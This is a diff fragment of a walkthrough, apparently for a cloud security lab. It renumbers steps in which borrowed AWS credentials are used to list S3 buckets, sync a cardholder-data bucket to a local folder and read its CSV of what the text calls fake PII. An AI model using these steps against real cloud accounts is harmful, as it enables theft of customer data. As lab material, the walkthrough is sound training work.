@@ -218,14 +218,13 @@ Let's see what these credentials can do
 11. Attempt to list s3 buckets   
 `aws s3 ls --profile wrole`  
 Success!  
-13. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name    
+12. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name    
 `aws s3 cp s3://<bucket> ./cardholder --profile wrole`   
 That didn't work, maybe we can sync?   
-14. Sync the bucket with a local folder   
+13. Sync the bucket with a local folder   
 `aws s3 sync s3://<bucket> ./cardholder --profile wrole`  
-
 **Goal Achieved**  
-15. Review the new folder for creepy fake PII information     
+14. Review the new folder for creepy fake PII information     
 ```bash
 ls -la cardholder
 cat cardholder/cardholder_data_primary.csv
